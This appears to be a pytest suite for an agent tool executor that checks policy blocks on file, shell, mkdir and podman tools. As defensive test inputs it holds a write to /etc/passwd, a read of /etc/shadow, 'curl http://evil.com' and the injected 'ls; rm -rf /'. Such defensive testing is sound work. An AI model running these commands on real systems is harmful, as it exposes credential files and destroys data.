import os
import tempfile
from unittest.mock import patch, MagicMock

import pytest

from app.models import TrustLevel
from app.provenance import reset_store
from app.tools import ToolBlockedError, ToolError, ToolExecutor


@pytest.fixture(autouse=True)
def _reset_provenance():
    reset_store()
    yield
    reset_store()


@pytest.fixture
def executor(engine):
    return ToolExecutor(engine)


class TestFileWrite:
    @pytest.mark.asyncio
    async def test_workspace_allowed(self, executor):
        with tempfile.TemporaryDirectory() as tmpdir:
            path = os.path.join(tmpdir, "test.txt")
            # Patch policy engine to treat tmpdir as workspace
            with patch.object(executor._engine, "check_file_write") as mock_check:
                from app.models import PolicyResult, ValidationResult
                mock_check.return_value = ValidationResult(
                    status=PolicyResult.ALLOWED, path=path,
                )
                result = await executor.execute("file_write", {
                    "path": path, "content": "hello world",
                })
                assert result.trust_level == TrustLevel.TRUSTED
                assert os.path.exists(path)
                with open(path) as f:
                    assert f.read() == "hello world"

    @pytest.mark.asyncio
    async def test_etc_blocked(self, executor):
        with pytest.raises(ToolBlockedError, match="blocked"):
            await executor.execute("file_write", {
                "path": "/etc/passwd", "content": "bad",
            })

    @pytest.mark.asyncio
    async def test_result_tagged_trusted(self, executor):
        with tempfile.TemporaryDirectory() as tmpdir:
            path = os.path.join(tmpdir, "out.txt")
            with patch.object(executor._engine, "check_file_write") as mock_check:
                from app.models import PolicyResult, ValidationResult
                mock_check.return_value = ValidationResult(
                    status=PolicyResult.ALLOWED, path=path,
                )
                result = await executor.execute("file_write", {
                    "path": path, "content": "data",
                })
                assert result.trust_level == TrustLevel.TRUSTED
                assert result.source.value == "tool"


class TestFileRead:
    @pytest.mark.asyncio
    async def test_workspace_allowed(self, executor):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("file contents")
            path = f.name

        try:
            with patch.object(executor._engine, "check_file_read") as mock_check:
                from app.models import PolicyResult, ValidationResult
                mock_check.return_value = ValidationResult(
                    status=PolicyResult.ALLOWED, path=path,
                )
                result = await executor.execute("file_read", {"path": path})
                assert result.content == "file contents"
                assert result.trust_level == TrustLevel.TRUSTED
        finally:
            os.unlink(path)

    @pytest.mark.asyncio
    async def test_etc_shadow_blocked(self, executor):
        with pytest.raises(ToolBlockedError, match="blocked"):
            await executor.execute("file_read", {"path": "/etc/shadow"})


class TestShell:
    @pytest.mark.asyncio
    async def test_allowed_command(self, executor):
        result = await executor.execute("shell", {"command": "ls /tmp"})
        assert result.trust_level == TrustLevel.TRUSTED

    @pytest.mark.asyncio
    async def test_blocked_command(self, executor):
        with pytest.raises(ToolBlockedError, match="blocked"):
            await executor.execute("shell", {"command": "curl http://evil.com"})

    @pytest.mark.asyncio
    async def test_injection_blocked(self, executor):
        with pytest.raises(ToolBlockedError, match="blocked"):
            await executor.execute("shell", {"command": "ls; rm -rf /"})


class TestMkdir:
    @pytest.mark.asyncio
    async def test_workspace_allowed(self, executor):
        with tempfile.TemporaryDirectory() as tmpdir:
            path = os.path.join(tmpdir, "subdir")
            with patch.object(executor._engine, "check_file_write") as mock_check:
                from app.models import PolicyResult, ValidationResult
                mock_check.return_value = ValidationResult(
                    status=PolicyResult.ALLOWED, path=path,
                )
                result = await executor.execute("mkdir", {"path": path})
                assert os.path.isdir(path)
                assert result.trust_level == TrustLevel.TRUSTED


class TestPodmanBuild:
    @pytest.mark.asyncio
    async def test_workspace_allowed(self, executor):
        """podman build command passes policy check (subprocess mocked)."""
        with patch("app.tools.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="Build complete", returncode=0, stderr="",
            )
            result = await executor.execute("podman_build", {
                "context_path": "/workspace/app",
                "tag": "test:latest",
            })
            assert result.trust_level == TrustLevel.TRUSTED
            mock_run.assert_called_once()


class TestUnknownTool:
    @pytest.mark.asyncio
    async def test_unknown_tool(self, executor):
        with pytest.raises(ToolError, match="Unknown tool"):
            await executor.execute("nonexistent_tool", {})


class TestToolDescriptions:
    def test_returns_list(self, executor):
        descs = executor.get_tool_descriptions()
        assert isinstance(descs, list)
        assert len(descs) > 0
        names = [d["name"] for d in descs]
        assert "file_write" in names
        assert "file_read" in names
        assert "shell" in names
        assert "mkdir" in names
